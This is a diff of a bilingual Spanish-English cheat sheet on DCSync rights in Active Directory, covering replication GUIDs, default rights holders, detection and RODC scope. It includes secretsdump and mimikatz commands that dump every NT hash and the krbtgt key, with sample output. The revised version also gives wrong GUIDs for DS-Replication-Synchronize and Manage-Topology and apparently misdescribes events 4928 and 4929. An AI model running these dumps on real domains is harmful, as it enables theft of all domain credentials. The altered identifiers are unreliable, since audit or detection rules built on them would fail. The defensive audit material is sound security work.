@@ -3,11 +3,11 @@ aliases:
   - DCSync Definition
   - GetChanges
   - GetChangesAll
-  - Replication GUID
+  - DRSUAPI Replication
 tags:
   - type/cheatsheet
   - vuln/ad-enumeration
-  - technique/discovery
+  - technique/credential-access
   - asset/active-directory
 primary categories: null
 secondary categories: null
@@ -16,310 +16,140 @@ type: CheatSheet
 linked:
   - "[[AD - DCSync Rights Discovery]]"
 ---
-# AD - DCSync Rights Discovery - Rights Definition
+# AD - DCSync Rights Discovery - DCSync Rights Definition
 
 ***
 
 ## Replication Extended Rights
 
-| **Right** | **GUID** | **Notas** |
+| **GUID** | **Right** | **Función** |
 |:---:|:---:|:---:|
-| DS-Replication-Get-Changes | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Replication base. |
-| DS-Replication-Get-Changes-All | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Required for full DCSync. |
-| DS-Replication-Get-Changes-In-Filtered-Set | `89e95b76-444d-4c62-991a-0facbeda640c` | Filtered set (RODC). |
-| DS-Replication-Synchronize | `1131f6ab-9c07-11d1-f79f-00c04fc2dcd2` | Trigger replication. |
-| DS-Replication-Manage-Topology | `1131f6ac-9c07-11d1-f79f-00c04fc2dcd2` | Manage repl. |
-| DS-Replication-Monitor-Topology | `f98340fb-7c5b-4cdb-a00b-2ebdfa115a96` | Monitor only. |
-| Replicating Directory Changes (UI label) | Get-Changes | UI mapping. |
-| Replicating Directory Changes All (UI) | Get-Changes-All | UI mapping. |
-| Both required for DCSync | Combined | Standard. |
-| Get-Changes alone insufficient | Edge | Standard. |
-| RODC scope: Filtered set only | Limited | Edge. |
-| Cross-domain rights | Forest scope | Adjacent. |
-| Per-domain replication | Each domain | Standard. |
-| Default holders: DA, EA, Domain Controllers | Standard | Standard. |
-| Non-default holders = audit risk | Critical | Audit. |
-| Detection: replication queries from non-DC | Defender | Adjacent. |
+| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes` | Replicate metadata + filtered attrs. |
+| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes-All` | Replicate **all attrs** (incluye creds). |
+| `89e95b76-444d-4c62-991a-0facbeda640c` | `DS-Replication-Get-Changes-In-Filtered-Set` | RODC scope — filtered. |
+| `1131f6ac-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Synchronize` | Trigger replicación entre DCs. |
+| `1131f6ae-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Manage-Topology` | KCC manipulation (edge). |
 ^ad-dcsync-rights
 
-### Rights GUID reference
+**Combo crítico:** `GetChanges` + `GetChangesAll` sobre domain root = full DCSync. **Solo `GetChanges` no es suficiente** (no devuelve credenciales).
 
-```
-DS-Replication-Get-Changes
-  GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-  Effect: Read replicated attributes (some)
-
-DS-Replication-Get-Changes-All
-  GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-  Effect: Read all replicated attributes including secrets
-
-DS-Replication-Get-Changes-In-Filtered-Set
-  GUID: 89e95b76-444d-4c62-991a-0facbeda640c
-  Effect: Read filtered attribute set (RODC)
+```bash
+# DCSync requirement check via BloodHound
+# MATCH (u)-[r:GetChanges]->(d:Domain)
+# MATCH (u)-[r2:GetChangesAll]->(d)
+# RETURN u.name
 ```
 
 ___
 
 ## DCSync Mechanism
 
-| **Step** | **Detalle** | **Notas** |
+| **Step** | **Comando** | **Detalle** |
 |:---:|:---:|:---:|
-| 1. Auth as principal with rights | Standard | Standard. |
-| 2. Send DRSUAPI request | DRSUAPI = Directory Replication Service API | RPC. |
-| 3. Specify target user (or all) | Per-user or full dump | Standard. |
-| 4. DC replies with NT hash + Kerberos keys | Encrypted | Standard. |
-| 5. Decrypt with session key | Auto | Standard. |
-| krbtgt hash recoverable | Critical | Standard. |
-| All user passwords recoverable | Critical | Standard. |
-| Trust account hashes recoverable | Cross-trust impact | Critical. |
-| Implementation: secretsdump.py | Standard | Tool. |
-| Implementation: mimikatz dcsync | Standard | Tool. |
-| RPC port 49152+ (RPC dynamic) | Network | Standard. |
-| LDAP not required | DRSUAPI separate | Standard. |
-| Detection: DRSUAPI events | Defender | Adjacent. |
-| Detection: replication anomaly | Defender ML | Modern. |
-| Modern: BloodHound + Defender for Identity | Modern | Standard. |
-| Audit: replication source IPs | Adjacent | Defender. |
+| 1. Auth as principal con DCSync rights | `kinit user` o `runas` | Standard auth. |
+| 2. Connect a DC via DRSUAPI RPC | `secretsdump.py -just-dc` o mimikatz | Tool maneja. |
+| 3. Send `IDL_DRSGetNCChanges` request | RPC call | Tool internal. |
+| 4. DC valida ACE en domain root | `nTSecurityDescriptor` check | Auto. |
+| 5. DC retorna replication blob | Binary response | Tool. |
+| 6. Tool parses → NT hash + Kerberos keys + history | Output text | Tool. |
 ^ad-dcsync-mechanism
 
-### DCSync workflow
-
 ```bash
-# Linux Impacket
-impacket-secretsdump dom.local/admin:pass@DC -just-dc
+# Standard DCSync (Linux)
+secretsdump.py corp.local/atacante:'pass'@<DC> -just-dc
 
-# Output: all NT hashes including krbtgt
-# Format: user:RID:LM:NT:::
+# Output:
+# Administrator:500:aad3b435...:abc123...:::
+# krbtgt:502:aad3b435...:def456...:::
+# corp.local\jsmith:1234:aad3b435...:789xyz...:::
+# ...
 
-# Per-user
-impacket-secretsdump dom.local/admin:pass@DC -just-dc-user krbtgt
-
-# With NT hash auth (PtH)
-impacket-secretsdump -hashes :NTHASH dom.local/user@DC -just-dc
+# Targeted single user
+secretsdump.py 'corp.local/atacante:pass'@<DC> -just-dc-user Administrator
 ```
 
 ```cmd
-:: Mimikatz (Windows)
-mimikatz # privilege::debug
-mimikatz # lsadump::dcsync /domain:dom.local /user:krbtgt
+:: Mimikatz Windows
+lsadump::dcsync /domain:corp.local /user:krbtgt
+lsadump::dcsync /domain:corp.local /all /csv
 ```
 
 ___
 
 ## Default DCSync Holders
 
-| **Principal** | **Standard** | **Notas** |
+| **Principal** | **Por qué** | **Cuándo** |
 |:---:|:---:|:---:|
-| Domain Admins | Yes | Standard. |
-| Enterprise Admins | Yes (forest) | Standard. |
-| Administrators (BUILTIN) | Yes | Standard. |
-| Domain Controllers | Yes | DC computer accounts. |
-| Read-only Domain Controllers | Filtered scope | Edge. |
-| SYSTEM | Yes | Local system. |
-| Self (computer self-replication) | Yes | Standard. |
-| Cert Publishers | No (default) | Adjacent. |
-| Backup Operators | No (default) | Adjacent. |
-| Server Operators | No (default) | Adjacent. |
-| Account Operators | No (default) | Adjacent. |
-| Pre-Windows 2000 | No | Adjacent. |
-| Cross-trust DCs | Edge | Adjacent. |
-| Forest root DCs | Yes | Standard. |
-| Foreign DA | Edge — usually no | Edge. |
-| Default + custom | Audit non-default | Standard. |
+| Domain Admins | Tier 0 default | Standard. |
+| Enterprise Admins (forest root) | Forest Tier 0 | Standard. |
+| Administrators (Built-in) | Local DC admins | Standard. |
+| Domain Controllers | Replication legítima | Standard. |
+| Read-only Domain Controllers | RODC scope (filtered) | Standard. |
+| Schema Admins (forest root) | Schema replication | Edge — typically empty. |
 ^ad-dcsync-defaults
 
-### Default holders verification
-
-```powershell
-# Should match expected default holders
-$dcsyncRights = @(
-  "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # Get-Changes
-  "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"   # Get-Changes-All
-)
-
-$expectedDefaults = @(
-  "Domain Admins",
-  "Enterprise Admins",
-  "Administrators",
-  "Domain Controllers",
-  "Enterprise Read-only Domain Controllers",
-  "SYSTEM"
-)
-
-Get-Acl "AD:$((Get-ADDomain).DistinguishedName)" |
-  Select -ExpandProperty Access |
-  Where {
-    $_.AccessControlType -eq "Allow" -and
-    $_.ObjectType -in $dcsyncRights
-  } |
-  Where {
-    $name = $_.IdentityReference.Value -replace ".*\\",""
-    $expectedDefaults -notcontains $name
-  } |
-  Select IdentityReference,ActiveDirectoryRights,ObjectType
-# Output: NON-DEFAULT DCSync holders (audit critical)
-```
+**Audit principle:** cualquier principal **fuera de esa lista** con DCSync rights = audit finding crítico. Common attack persistence.
 
 ___
 
-## Storage Location of DCSync Rights
+## Storage Location
 
-| **Location** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Domain root object | `DC=dom,DC=local` | Primary. |
-| Granted via DACL on domain root | Standard | Standard. |
-| ExtendedRight type ACE | Specific to GUIDs | Standard. |
-| Per-domain | Each domain has own | Adjacent. |
-| Forest root domain | Tier 0 forest-wide | Standard. |
-| Cross-domain replication | Edge | Adjacent. |
-| RODC filtered scope | Limited | Edge. |
-| `nTSecurityDescriptor` attribute | Standard | Standard. |
-| Inheritance from domain root | Standard | Standard. |
-| Per-OU not applicable | Domain-wide right | Standard. |
-| Detection: domain root ACL modify | Defender | Critical alert. |
-| Audit: per-domain DCSync holders | Standard | Compliance. |
-| Documented baseline | Standard | Adjacent. |
-| Cross-correlate with priv tier | Standard | Audit. |
-| Stale ACE | Audit | Standard. |
-| Modern: continuous monitoring | Defender | Standard. |
+| `Get-Acl "AD:DC=corp,DC=local"` | DACL del domain root (donde viven DCSync ACEs) | Audit standard. |
+| `(Get-Acl "AD:DC=corp,DC=local").Access \| ? ObjectType -in (DCSync GUIDs)` | Solo ACEs DCSync | Targeted. |
+| `Get-ADRootDSE \| Select defaultNamingContext` | Domain root DN | Bootstrap. |
 ^ad-dcsync-location
 
-### Domain root ACL inspection
-
-```bash
-# LDAP raw
-ldapsearch -h DC -D 'dom\u' -w pass \
-  -b "DC=dom,DC=local" -s base \
-  "(objectClass=*)" nTSecurityDescriptor
-
-# bloodyAD decoded
-bloodyAD --host DC -d dom -u user -p pass \
-  get object "DC=dom,DC=local" --resolve-sd
-
-# Filter for DCSync GUIDs in output
-```
+**DACL location:** ACEs viven en `nTSecurityDescriptor` del domain root object (`DC=corp,DC=local`). No en otros lados (no en Configuration NC, no en Schema NC para domain DCSync).
 
 ___
 
 ## Detection Considerations
 
-| **Aspect** | **Detalle** | **Notas** |
+| **Event ID** | **Significa** | **Cuándo logueado** |
 |:---:|:---:|:---:|
-| Event ID 4662 | Per-attribute access | Per-object. |
-| Filter: Replicating Directory GUID | Specific filter | Defender. |
-| Detection: replication from non-DC IP | Anomaly | Defender ML. |
-| Microsoft Defender for Identity | DCSync alert | Modern. |
-| Sysmon network DRSUAPI | Adjacent | Adjacent. |
-| Detection: DRSUAPI from server | DC-only IP whitelist | Defender. |
-| Audit log retention | Standard | Compliance. |
-| Bulk DCSync = critical alert | Defender | Standard. |
-| Per-user DCSync (just-dc-user) | Stealthier | OPSEC. |
-| Detection: replication anomaly | Modern | Defender. |
-| OPSEC: source IP from DC | Edge | OPSEC. |
-| Modern: extreme alerting | Critical | Standard. |
-| Compliance: detected/responded events | Standard | Adjacent. |
-| Cross-correlate with auth events | Standard | Defender. |
-| Honeytoken: krbtgt access alert | Defender plant | Detection. |
-| Honeypot accounts: monitor reads | Defender | Detection. |
+| `4662` (Object Access — Directory Service Access) | Per-attribute access logged | Si SACL configurado. |
+| `4929` (Directory Service Access — replication) | Replication request | Standard. |
+| `4928` | Replication source recibido | Standard. |
+| MDI alerta `Suspected DCSync attack` | Bulk replication anomaly | Modern detection. |
+| Kerberos auth from non-DC source IP | Anomalous DCSync source | Defender side. |
 ^ad-dcsync-detection
 
-### Detection signal patterns
-
-```
-Event ID 4662 (Object access — Directory Service):
-  Object Server: DS
-  Object Type: Domain
-  Properties: 
-    1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  (Get-Changes)
-    1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  (Get-Changes-All)
-
-Microsoft Defender for Identity:
-  Alert: "Suspicious replication request"
-
-Source IP analysis:
-  Replication from non-DC IP = anomaly
-  Replication from workstation = critical alert
+```powershell
+# Defender side — verify SACL en domain root
+$sd = (Get-ADObject "DC=corp,DC=local" -Properties nTSecurityDescriptor).nTSecurityDescriptor
+$sd.Audit | Where { $_.ObjectType -in (DCSync GUIDs) }
 ```
 
 ___
 
-## Replication Filtered Set (RODC)
+## RODC Filtered Set
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| RODC = Read-Only DC | Filtered creds | Standard. |
-| `Get-Changes-In-Filtered-Set` | RODC scope right | Standard. |
-| RODC krbtgt-RODC | Filtered krbtgt | Specific. |
-| Cached creds only on RODC | Per RODC password replication policy | Standard. |
-| `msDS-RevealedDSAs` attribute | Cached principals | Adjacent. |
-| `msDS-NeverRevealGroup` | Denied principals | Hardening. |
-| `msDS-RevealOnDemandGroup` | Allowed principals | Standard. |
-| Tier 0 typically denied | Best practice | Standard. |
-| Compromise RODC = filtered creds | Limited blast | Standard. |
-| BloodHound RODC support | Modern | Tool. |
-| Detection: RODC replication anomaly | Defender | Adjacent. |
-| Forest root RODC | Edge | Edge. |
-| Cross-domain RODC | Edge | Adjacent. |
-| `Get-Changes-In-Filtered-Set` rights granted to RODCs | Standard | Standard. |
-| RODC misconfig: too many cached | Audit | Standard. |
-| Per-RODC password replication policy audit | Standard | Compliance. |
+| `Get-ADDomainController -Filter {IsReadOnly -eq $true}` | RODC list | Adjacent. |
+| `Get-ADObject "<RODC-NTDS-DN>" -Properties msDS-RevealedDSAs,msDS-NeverRevealGroup` | Cuentas con cred replicación al RODC | Per-RODC scope. |
+| `Get-ADGroup "Allowed RODC Password Replication Group"` | Allowed list | Standard. |
+| `Get-ADGroup "Denied RODC Password Replication Group"` | Denied list (Tier 0 default) | Standard. |
 ^ad-dcsync-rodc
 
-### RODC analysis
-
-```powershell
-# RODCs in domain
-Get-ADDomainController -Filter {IsReadOnly -eq $true} | Select Name,Site
-
-# Per-RODC password replication policy
-$rodcs = Get-ADDomainController -Filter {IsReadOnly -eq $true}
-foreach ($rodc in $rodcs) {
-  Write-Host "`n=== $($rodc.Name) ==="
-  
-  # Allowed (will reveal password)
-  Write-Host "Allowed (reveals password):"
-  Get-ADDomainControllerPasswordReplicationPolicy $rodc -Allowed |
-    Select Name,SamAccountName | Format-Table
-  
-  # Denied
-  Write-Host "Denied (won't reveal):"
-  Get-ADDomainControllerPasswordReplicationPolicy $rodc -Denied |
-    Select Name,SamAccountName | Format-Table
-}
-```
+**RODC scope:** RODCs solo replican passwords de `Allowed RODC Password Replication Group` members. `Denied` group (Tier 0 — DA, EA, etc) **nunca** replicado a RODC. RODC compromise = solo creds de Tier 1/2 expuestos.
 
 ___
 
-## DCSync vs Replication for Security
+## DCSync vs DC Replication
 
-| **Aspect** | **DCSync (atacante)** | **DC Replication (legit)** |
+| **Aspecto** | **DCSync** | **DC Replication legítima** |
 |:---:|:---:|:---:|
-| Source | Non-DC host | DC |
-| Authentication | Compromised user/computer | DC machine account |
-| Destination | Atacante | Other DC |
-| Frequency | One-shot typically | Periodic (15min default) |
-| Detection signal | Non-DC source IP | DC-to-DC traffic |
-| Impact | Credential theft | Standard operation |
-| Microsoft Defender for Identity | DCSync alert | No alert |
-| Modern hardening: source IP whitelist | DC-only allowed | Standard. |
-| Compliance: replication audit baseline | Defined IPs | Standard. |
-| RODC replication | Filtered | Standard. |
-| Cross-domain replication | Forest | Standard. |
-| Network: TCP RPC dynamic ports | Both | Standard. |
-| Adjacent: Trust replication | Edge | Adjacent. |
-| OPSEC: DCSync from DC = bypass IP detection | Edge | OPSEC. |
-| Modern: extreme alerting on DCSync | Standard | Defender. |
-| Per-DC source IP audit | Standard | Adjacent. |
+| Source | Tool atacante (mimikatz/secretsdump) | DC ↔ DC. |
+| Source IP | Workstation atacante | Otro DC. |
+| Frequency | One-shot | Periódica (cada ~15min default). |
+| Auth | User credential | Computer (DC) account. |
+| MDI baseline | Fuera de baseline | Dentro de baseline. |
+| Detection | Anomaly | Normal. |
 ^ad-dcsync-vs-replication
 
-### Source IP audit
-
-```powershell
-# All DCs in domain
-$dcs = Get-ADDomainController -Filter * | Select -ExpandProperty IPv4Address
-
-# In SIEM, alert on Event 4662 with replication GUID where source IP NOT in $dcs
-# Custom detection: Replication from non-DC IP = critical alert
-```
+**Defender SIEM rule:** alert on `4662` con DCSync GUIDs **donde source IP no es un DC**. Reduce false positives.
 
 ***
